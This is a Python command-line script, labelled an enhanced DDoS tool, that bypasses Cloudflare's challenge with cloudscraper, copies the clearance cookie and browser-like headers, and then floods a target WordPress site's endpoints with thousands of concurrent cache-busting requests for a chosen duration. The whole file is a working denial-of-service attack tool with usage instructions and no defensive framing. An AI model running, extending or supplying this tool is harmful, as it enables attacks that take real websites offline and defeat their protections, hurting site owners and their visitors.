#!/usr/bin/env python3
"""
ENHANCED DDOS - WordPress + Cloudflare Bypass
"""

import asyncio
import aiohttp
import ssl
import random
import time
import sys
import hashlib
from typing import Dict, Optional
import cloudscraper  # pip install cloudscraper
from bs4 import BeautifulSoup  # pip install beautifulsoup4

# ============================================================
# ADVANCED CLOUDFLARE BYPASS
# ============================================================
class CloudflareBypass:
    @staticmethod
    def solve_challenge(url: str) -> Dict:
        """Solve Cloudflare challenge using cloudscraper"""
        try:
            scraper = cloudscraper.create_scraper(
                browser={
                    'browser': 'chrome',
                    'platform': 'windows',
                    'desktop': True,
                }
            )
            
            # Get challenge page
            response = scraper.get(url, timeout=30)
            
            # Check if challenge was solved
            if "cf_clearance" in scraper.cookies:
                cookies = scraper.cookies.get_dict()
                return {
                    "cookies": cookies,
                    "user_agent": scraper.headers.get("User-Agent"),
                    "success": True
                }
            return {"success": False}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    @staticmethod
    def get_cf_clearance_cookie(url: str) -> Optional[str]:
        """Extract cf_clearance cookie"""
        result = CloudflareBypass.solve_challenge(url)
        if result.get("success"):
            return result["cookies"].get("cf_clearance")
        return None

# ============================================================
# ADVANCED HEADER GENERATION
# ============================================================
def generate_cloudflare_headers(cookie: Optional[str] = None) -> Dict:
    """Generate headers that mimic real browser for Cloudflare"""
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
        ]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Expires": "0",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "sec-ch-ua": '"Google Chrome";v="141", "Chromium";v="141", "Not?A_Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Connection": "keep-alive",
    }
    
    if cookie:
        headers["Cookie"] = cookie
    
    return headers

# ============================================================
# WORDSPRESS ATTACK FUNCTIONS
# ============================================================
async def attack_wordpress(target: str, duration: int, threads: int = 5000):
    """Attack WordPress site with Cloudflare bypass"""
    
    print("╔══════════════════════════════════════════════════╗")
    print("║     WORDPRESS + CLOUDFLARE ATTACKER           ║")
    print("╚══════════════════════════════════════════════════╝")
    
    # Step 1: Get Cloudflare bypass
    print("[*] Solving Cloudflare challenge...")
    
    cf_bypass = CloudflareBypass()
    cf_clearance = cf_bypass.get_cf_clearance_cookie(target)
    
    if cf_clearance:
        print(f"[+] Cloudflare bypass successful!")
        print(f"[+] cf_clearance: {cf_clearance[:30]}...")
    else:
        print("[!] Cloudflare bypass failed - may not be protected")
    
    # Step 2: WordPress-specific endpoints
    wp_endpoints = [
        "/", "/wp-admin/", "/wp-login.php", "/wp-json/",
        "/wp-content/", "/wp-includes/", "/xmlrpc.php",
        "/wp-admin/admin-ajax.php", "/wp-admin/admin-post.php",
        "/wp-cron.php", "/feed/", "/comments/feed/",
    ]
    
    # Step 3: Attack
    print(f"[*] Starting attack on WordPress + Cloudflare")
    print(f"[*] Threads: {threads}")
    print(f"[*] Duration: {duration} seconds")
    print("[*] Press Ctrl+C to stop")
    
    headers = generate_cloudflare_headers(cf_clearance)
    
    # Create session with Cloudflare bypass
    conn = aiohttp.TCPConnector(
        ssl=False,
        force_close=True,
        limit=0,
        ttl_dns_cache=300,
    )
    
    async with aiohttp.ClientSession(
        connector=conn,
        timeout=aiohttp.ClientTimeout(total=10),
        headers=headers,
    ) as session:
        
        # Launch attacks
        tasks = []
        stats = {"total": 0, "errors": 0, "429": 0}
        stats_lock = asyncio.Lock()
        
        async def worker():
            while time.time() - start_time < duration:
                try:
                    # Random endpoint
                    endpoint = random.choice(wp_endpoints)
                    url = target.rstrip('/') + endpoint
                    
                    # Random query param for cache bypass
                    if random.random() < 0.7:
                        cache_bust = f"?v={random.randint(1,1000000)}"
                        url += cache_bust
                    
                    # Random method
                    method = random.choice(["GET", "GET", "GET", "HEAD"])
                    
                    if method == "GET":
                        async with session.get(url) as resp:
                            await resp.text()
                            status = resp.status
                    else:
                        async with session.head(url) as resp:
                            status = resp.status
                    
                    # Track stats
                    async with stats_lock:
                        stats["total"] += 1
                        if status == 429:
                            stats["429"] += 1
                            await asyncio.sleep(random.uniform(0.5, 2))
                    
                except Exception:
                    async with stats_lock:
                        stats["errors"] += 1
                    await asyncio.sleep(0.1)
        
        start_time = time.time()
        
        # Start workers
        for i in range(threads):
            tasks.append(asyncio.create_task(worker()))
        
        # Status reporter
        async def report():
            while time.time() - start_time < duration:
                await asyncio.sleep(1)
                elapsed = time.time() - start_time
                async with stats_lock:
                    total = stats["total"]
                    errors = stats["errors"]
                    rate_limit = stats["429"]
                    rps = total / elapsed if elapsed > 0 else 0
                
                print(f"\r[+] Elapsed: {elapsed:.0f}/{duration}s | Requests: {total} | RPS: {rps:.0f} | 429: {rate_limit} | Errors: {errors}", end="")
                sys.stdout.flush()
        
        # Run attack
        try:
            await asyncio.gather(
                asyncio.wait_for(asyncio.gather(*tasks), timeout=duration),
                asyncio.create_task(report()),
                return_exceptions=True
            )
        except asyncio.TimeoutError:
            pass
        
        # Summary
        elapsed = time.time() - start_time
        async with stats_lock:
            total = stats["total"]
            errors = stats["errors"]
            rate_limit = stats["429"]
            rps = total / elapsed if elapsed > 0 else 0
        
        print(f"\n\n[+] Attack complete!")
        print(f"[+] Total requests: {total}")
        print(f"[+] Average RPS: {rps:.0f}")
        print(f"[+] Rate limited (429): {rate_limit}")
        print(f"[+] Errors: {errors}")

# ============================================================
# MAIN
# ============================================================
def main():
    if len(sys.argv) < 4:
        print("Usage: python3 wp_attack.py <target> <seconds> <threads>")
        print("Example: python3 wp_attack.py https://site.com 60 5000")
        sys.exit(1)
    
    target = sys.argv[1]
    duration = int(sys.argv[2])
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 5000
    
    asyncio.run(attack_wordpress(target, duration, threads))

if __name__ == "__main__":
    main()
